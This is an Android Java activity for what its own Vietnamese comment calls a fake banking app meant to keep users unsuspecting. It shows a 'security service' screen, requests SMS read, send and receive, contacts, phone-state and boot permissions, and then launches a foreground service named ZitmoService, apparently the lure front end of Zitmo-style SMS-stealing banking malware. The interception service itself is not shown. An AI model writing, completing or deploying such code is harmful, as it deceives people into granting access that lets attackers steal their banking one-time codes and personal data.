package com.research.banking;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/**
 * MainActivity - Giao diện giả mạo phần mềm ngân hàng để người dùng không nghi ngờ
 */
public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK
    };

    // Yêu cầu quyền bổ sung cho Android 11+
    private static final String[] ADDITIONAL_PERMISSIONS_ANDROID_11 = {
            Manifest.permission.READ_PHONE_NUMBERS
    };

    private TextView statusTextView;
    private Button activateButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Khởi tạo các view
        statusTextView = findViewById(R.id.status_text);
        activateButton = findViewById(R.id.activate_button);

        // Thiết lập nút kích hoạt
        activateButton.setOnClickListener(v -> requestPermissions());

        // Kiểm tra và yêu cầu quyền nếu chưa có
        if (hasAllPermissions()) {
            startZitmoService();
            updateUI(true);
        } else {
            updateUI(false);
        }
    }

    private void updateUI(boolean isActive) {
        if (isActive) {
            statusTextView.setText(R.string.security_service_running);
            activateButton.setText(R.string.already_activated);
            activateButton.setEnabled(false);
        } else {
            statusTextView.setText(R.string.security_service_disabled);
            activateButton.setText(R.string.activate_now);
            activateButton.setEnabled(true);
        }
    }

    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        // Kiểm tra quyền bổ sung cho Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            for (String permission : ADDITIONAL_PERMISSIONS_ANDROID_11) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }

        return true;
    }

    private void requestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        // Thêm các quyền cơ bản còn thiếu
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        // Thêm quyền bổ sung cho Android 11+ nếu cần
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            for (String permission : ADDITIONAL_PERMISSIONS_ANDROID_11) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                    permissionsToRequest.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
        } else {
            startZitmoService();
            updateUI(true);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                startZitmoService();
                updateUI(true);
                Toast.makeText(this, R.string.service_activated, Toast.LENGTH_SHORT).show();
            } else {
                new AlertDialog.Builder(this)
                        .setTitle(R.string.permissions_required)
                        .setMessage(R.string.permissions_rationale)
                        .setPositiveButton(R.string.try_again, (dialog, which) -> requestPermissions())
                        .setNegativeButton(R.string.not_now, (dialog, which) -> dialog.dismiss())
                        .create()
                        .show();
            }
        }
    }

    private void startZitmoService() {
        // Khởi động service
        Intent serviceIntent = new Intent(this, ZitmoService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}